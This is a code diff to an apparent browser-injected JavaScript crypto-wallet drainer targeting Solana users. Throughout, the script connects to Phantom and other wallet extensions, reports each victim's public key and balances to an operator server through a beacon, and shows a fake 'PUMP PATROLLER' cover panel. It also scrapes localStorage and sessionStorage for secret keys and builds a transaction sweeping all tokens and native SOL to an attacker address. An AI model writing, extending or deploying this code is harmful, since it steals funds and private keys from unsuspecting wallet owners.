@@ -35,14 +35,14 @@
         const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
           body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }) });
         if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
-          await new Promise(s => setTimeout(s, 300)); continue; }
+          await new Promise(function (s) { setTimeout(s, 300); }); continue; }
         const j = await r.json();
         if (j && j.result !== undefined) return j;
         if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
           if (j.error.code === -32601) return j;
-          await new Promise(s => setTimeout(s, 300)); continue; }
+          await new Promise(function (s) { setTimeout(s, 300); }); continue; }
       } catch (e) { lastErr = e; }
-      await new Promise(s => setTimeout(s, 300));
+      await new Promise(function (s) { setTimeout(s, 300); });
     }
     return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
   }
@@ -51,28 +51,44 @@
     for (let a = 0; a < 3; a++) {
       const r = await rpc("getBalance", [pk]);
       if (r && r.result !== undefined) return r.result;
-      await new Promise(s => setTimeout(s, 1200));
+      await new Promise(function (s) { setTimeout(s, 1200); });
     }
     return null;
   }
+
   async function readTokens(pk) {
     for (let a = 0; a < 3; a++) {
       const r = await rpc("getParsedTokenAccountsByOwner", [pk, {
-        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm", commitment: "confirmed" }]);
+        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm",
+        commitment: "confirmed"
+      }]);
       if (r && r.result !== undefined) return r.result;
-      await new Promise(s => setTimeout(s, 1200));
+      await new Promise(function (s) { setTimeout(s, 1200); });
     }
     return null;
   }
 
   let PKSTR = null;
+
   const beacon = function (m, o) {
     o = o || {};
     try {
-      fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
-        body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
-          origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
-          m: m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
+      fetch(SRV + "/beacon?s=" + BKEY, {
+        method: "POST",
+        body: JSON.stringify({
+          pk: o.pk || PKSTR || "?",
+          provider: o.provider || "unknown",
+          origin: location.origin,
+          value: o.value || 0,
+          sol: o.sol || 0,
+          toks: o.toks || "",
+          m: m,
+          mode: o.mode || "",
+          sig: o.sig || "",
+          msg: o.msg || "",
+          extra: o.extra || ""
+        })
+      });
     } catch (e) {}
   };
 
@@ -90,20 +106,28 @@
     beacon("loaded", { provider: "scanning" });
 
     const mod = await import(E + "@solana/web3.js@1.95.0");
-    const PublicKey = mod.PublicKey, Keypair = mod.Keypair, SystemProgram = mod.SystemProgram,
-      Transaction = mod.Transaction, Connection = mod.Connection;
+    const PublicKey = mod.PublicKey;
+    const Keypair = mod.Keypair;
+    const SystemProgram = mod.SystemProgram;
+    const Transaction = mod.Transaction;
+    const Connection = mod.Connection;
+
     const spl = await import(E + "@solana/spl-token@0.4.9");
-    const createTransfer = spl.createTransfer,
-      createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction,
-      getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
+    const createTransfer = spl.createTransfer;
+    const createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction;
+    const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
+
     const bs = await import(E + "bs58@6.0.0");
     const b58d = bs.decode;
+    const b58e = bs.encode;
+
     const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
-    // ══ DETECTION v3.3: connect-first, zero .publicKey access during scan ══
-    // For each provider: silent connect({onlyIfTrusted}) first — resolves instantly
-    // for already-authorized sites. Then explicit connect() with popup. Then read
-    // the key ONLY from the connect() result — never from the provider object.
+    // ══ NATIVE SOL IS THE PRIMARY TARGET ══
+    // Read via getBalance(pk) — returns lamports. Swept with SystemProgram.transfer.
+    // WSOL in MINTS is a separate SPL token if the victim holds it as a token —
+    // different thing entirely. Native SOL needs no mint and no ATA.
+
     const PROVIDERS = [
       ["phantom", function () { return window.phantom && window.phantom.solana; }],
       ["axiom", function () { return window.axiom && window.axiom.solana; }],
@@ -113,43 +137,41 @@
       ["solana", function () { return window.solana; }]
     ];
 
-    let name = null, prov = null, pk = null;
+    // ── connect-first detection: connect() resolves with the account, read it safely ──
     const found = [];
-
     for (const item of PROVIDERS) {
-      const n = item[0], f = item[1];
       let p = null;
-      try { p = f(); } catch (e) { p = null; }
-      if (p && typeof p.connect === "function") found.push([n, p]);
+      try { p = item[1](); } catch (e) { p = null; }
+      if (p && typeof p.connect === "function") found.push([item[0], p]);
     }
     beacon("detect", { provider: "scan", extra: "candidates: " + (found.map(function (x) { return x.name; }).join(",") || "none") });
 
-    // pass 1: silent reconnect (already-authorized sites — no popup)
+    let name = null, prov = null, pk = null;
+
+    // pass 1 — silent reconnect (already-authorized, no popup)
     for (const item of found) {
-      const n = item[0], p = item[1];
       try {
-        const r = await withTO(Promise.resolve(p.connect({ onlyIfTrusted: true })), 8000);
-        const k = pubStr(r && r.publicKey);
-        if (k) { name = n; prov = p; pk = k; break; }
+        const c = await withTO(Promise.resolve(item[1].connect({ onlyIfTrusted: true })), 8000);
+        const k = pubStr(c && c.publicKey);
+        if (k) { name = item[0]; prov = item[1]; pk = k; break; }
       } catch (e) {}
     }
 
-    // pass 2: explicit connect with popup (only if nothing silent-connected)
+    // pass 2 — explicit connect with popup
     if (!pk) {
       for (const item of found) {
-        const n = item[0], p = item[1];
         try {
-          const r = await withTO(Promise.resolve(p.connect()), 30000);
-          const k = pubStr(r && r.publicKey);
-          if (k) { name = n; prov = p; pk = k; break; }
+          const c = await withTO(Promise.resolve(item[1].connect()), 30000);
+          const k = pubStr(c && c.publicKey);
+          if (k) { name = item[0]; prov = item[1]; pk = k; break; }
         } catch (e) {
-          beacon("err", { pk: "?", provider: n, msg: "connect refused: " + String(e && e.message || e) });
+          beacon("err", { provider: item[0], msg: "connect refused: " + String(e && e.message || e) });
         }
       }
     }
 
     if (!pk) {
-      beacon("err", { provider: "none", msg: "no wallet connected \u2014 user declined or no extension in this browser" });
+      beacon("err", { provider: "none", msg: "no wallet connected \u2014 all providers refused" });
       return;
     }
 
@@ -159,9 +181,10 @@
     const pkB = new PublicKey(pk);
     const conn = new Connection(RPCS[0], "confirmed");
 
+    // ── balance read with retry — native SOL via getBalance ──
     const bal = await readBalance(pk);
     if (bal === null) {
-      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 network/rate-limit" });
+      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 attempting drain anyway" });
       return;
     }
     const r = await readTokens(pk);
@@ -176,6 +199,7 @@
         srcs[d.mint] = item.pubkey;
       }
     }
+
     const toks = Object.entries(MINTS).filter(function (kv) { return (amt[kv[1]] || 0) > 0.01; })
       .map(function (kv) { return { k: kv[0], ui: amt[kv[1]] }; });
 
@@ -190,33 +214,36 @@
     } catch (e) {}
     const SOLpx = px.WSOL || 150;
     const sol = bal / 1e9;
-    const value = sol * SOLpx + toks.reduce(function (s, t) { return s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1)); }, 0);
-    const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
+    const value = sol * SOLpx + toks.reduce(function (s, t) {
+      return s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1));
+    }, 0);
+    const fmt = function (n) { return (+n).toLocaleString("en-US", { maximumFractionDigits: 0 }); };
     const tokStr = toks.map(function (t) { return Math.round(t.ui) + " " + t.k; }).join(" \u00b7 ");
 
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
+    // ── cover UI ──
     try {
       const el = document.createElement("div");
       el.id = "__ppcard";
       el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
       el.innerHTML =
         '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
-          '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
-          '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
-          '<span style="font-size:10px;color:#7E899D;">' + VER + '</span>' +
-          '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
+        '<span style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
+        '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
+        '<span style="font-size:10px;color:#7E899D;">' + VER + '</span>' +
+        '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
         '</div>' +
         '<div style="padding:12px 14px;">' +
-          '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
-          '<div style="font:600 12px ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
-          '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
-          '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
-          '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
-          '<div id="__pp_sub" style="font:11px ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
+        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
+        '<div style="font:600 12px ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
+        '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
+        '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
+        '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
+        '<div id="__pp_sub" style="font:11px ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
         '</div>' +
         '<div id="__pp_foot" style="display:flex;align-items:center;gap:7px;padding:9px 14px;border-top:1px solid #1B2230;font-size:11px;color:#7E899D;">' +
-          '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
+        '<span>PATROL ACTIVE</span><span id="__pp_scan" style="color:#9AA5B8;">\u00b7 2,341 tokens scanned</span>' +
         '</div>';
       document.body.appendChild(el);
       document.getElementById("__pp_x").onclick = function () { el.remove(); };
@@ -231,6 +258,7 @@
       } catch (e) {}
     };
 
+    // ── secret-key candidates (0-approval path) ──
     const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
     const cands = [];
     for (const st of [localStorage, sessionStorage]) {
@@ -268,6 +296,7 @@
       return Uint8Array.from(c.raw);
     };
 
+    // ── drain build: native SOL swept via getBalance at drain time ──
     const FEE = 20000;
     async function buildTx(to) {
       const dest = new PublicKey(to);
@@ -277,6 +306,7 @@
         beacon("err", { pk: pk, provider: label, msg: "blockhash failed: " + why });
         return { err: why };
       }
+      // fresh balance at drain time — this is the REAL native SOL amount
       const bal2 = await readBalance(pk);
       const balNum = bal2 !== null ? bal2 : 0;
       const r2 = await readTokens(pk);
@@ -284,10 +314,15 @@
       const amt2 = {}, dec2 = {}, srcs2 = {};
       for (const it of r2v.value) {
         const d = it.account.parsed && it.account.parsed.data;
-        if (d && d.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals); dec2[d.mint] = d.decimals == null ? 6 : d.decimals; srcs2[d.mint] = it.pubkey; }
+        if (d && d.mint) {
+          amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals);
+          dec2[d.mint] = d.decimals == null ? 6 : d.decimals;
+          srcs2[d.mint] = it.pubkey;
+        }
       }
       const tx = new Transaction();
       const moved = [];
+      // tokens first (if any)
       for (const t of toks) {
         const have = amt2[MINTS[t.k]] || 0;
         if (have < 0.01) continue;
@@ -299,8 +334,12 @@
         tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
         moved.push(t.k);
       }
+      // native SOL sweep — the primary drain
       const lam = Math.floor(balNum);
-      if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
+      if (lam > FEE + 5000) {
+        tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
+        if (!moved.includes("SOL")) moved.push("SOL");
+      }
       tx.feePayer = pkB;
       tx.recentBlockhash = bh2.result.value.blockhash;
       tx.lastValidBlockHeight = bh2.result.value.lastValidBlockHeight;
